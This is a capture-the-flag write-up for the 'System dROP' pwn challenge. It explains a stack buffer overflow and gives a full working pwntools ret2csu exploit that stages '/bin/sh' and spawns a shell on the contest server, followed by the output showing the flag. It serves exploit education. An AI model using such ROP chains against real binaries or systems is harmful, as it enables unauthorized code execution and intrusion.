# Cyber Apocalypse 2021

## System dROP

> In the dark night, we managed to sneak in the plant that manages all the resources. Ready to deploy our root-kit and stop this endless draining of our planet, we accidentally triggered the alarm! Acid started raining from the ceiling, destroying almost everything but us and small terminal-like console. We can see no output, but it still seems to work, somehow..
> 
> This challenge will raise 33 euros for a good cause.
>
> [`pwn_system_drop.zip`](`pwn_system_drop.zip`)

Tags: _pwn_ _x86-64_ _bof_ _ret2csu_


## Summary

The title suggests, use [SROP](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming).  The flag `CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}` also suggests its usage as well, so let's not use it and use a [ret2csu](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) chain instead.

ret2csu is a _super_ gadget that can call any function _by reference_ and pass up to three parameters.  Very useful for `read` and `execve`.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No canary and no PIE, easy BOF, easy ROP.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  undefined local_28 [32];
  
  alarm(0xf);
  read(0,local_28,0x100);
  return 1;
}
```

That's it, BOF with `read`.  216 (`0x100 - 0x28`) bytes for our payload.

```
long _syscall(long __sysno,...)
{
  long in_RAX;
  
  syscall();
  return in_RAX;
}
```

A free _syscall_ function is also included, not a _win_ function, but we'll take it.

> How to solve this without the free `syscall`: [smol](https://github.com/datajerk/ctf-write-ups/tree/master/nahamconctf2021/smol)


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./system_drop')

payload  = b''
payload += 0x28 * b'A'

# CSU
'''
  4005b0:   4c 89 fa                mov    rdx,r15
  4005b3:   4c 89 f6                mov    rsi,r14
  4005b6:   44 89 ef                mov    edi,r13d
  4005b9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005bd:   48 83 c3 01             add    rbx,0x1
  4005c1:   48 39 dd                cmp    rbp,rbx
  4005c4:   75 ea                   jne    4005b0 <__libc_csu_init+0x40>
  4005c6:   48 83 c4 08             add    rsp,0x8
  4005ca:   5b                      pop    rbx
  4005cb:   5d                      pop    rbp
  4005cc:   41 5c                   pop    r12
  4005ce:   41 5d                   pop    r13
  4005d0:   41 5e                   pop    r14
  4005d2:   41 5f                   pop    r15
  4005d4:   c3                      ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ca
set_rdx_rsi_rdi_call_r12 = 0x4005b0

# read bytes to set rax as 0x3b and setup /bin/sh and pointer to syscall
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.got.read) # r12 pointer to function
payload += p64(0) # r13 -> rdi
payload += p64(binary.bss()) # r14 -> rsi
payload += p64(constants.SYS_execve) # r15 -> rdx
payload += p64(set_rdx_rsi_rdi_call_r12)

# call syscall
payload += p64(0) # add rsp,0x8
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.bss() + 8) # r12 pointer to function
payload += p64(binary.bss()) # r13 -> rdi
payload += p64(0) # r14 -> rsi
payload += p64(0) # r15 -> rdx
payload += p64(set_rdx_rsi_rdi_call_r12)

if args.REMOTE:
    p = remote('46.101.23.157',31056)
else:
    p = process(binary.path)

p.send(payload + b'A' * (0x100 - len(payload)))
fodder = b'/bin/sh\0' + p64(binary.sym._syscall)
p.send(fodder + (constants.SYS_execve - len(fodder)) * b'A')
p.interactive()
```

From the top down, first we send `0x28` bytes of garbage to get to the return address on the stack (see Ghidra stack diagram).

The first ret2csu calls `read` (by reference, i.e. `binary.got.read`) and passes parameters `0` (stdin), `binary.bss()` as the buffer, and `constants.SYS_execve` (`0x3b`) as the length.

_Once the payload starts_ `read` gladly accept our input `b'/bin/sh\0' + p64(binary.sym._syscall)` plus padding to `constants.SYS_execve` (`0x3b`).  This will leave `0x3b` in `RAX`, which is what we need for the `execve` syscall, and the BSS will have `/bin/sh\0` followed by the address of `_syscall`.

The second ret2csu calls `_syscall` also by reference (`binary.bss() + 8` (pointer to `_syscall`)) and passes parameters `binary.bss()` (`/bin/sh\0`), `0`, and `0` for `execve`.

With `0x3b` in RAX, and the BSS setup, `_syscall` pops a shell.

> Don't linger around, `cat flag.txt` and get out before `alarm(0xf)` kills you.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/cyberapocalypsectf2021/system_drop/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 46.101.23.157 on port 31056: Done
[*] Switching to interactive mode
$ cat flag.txt
CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
```
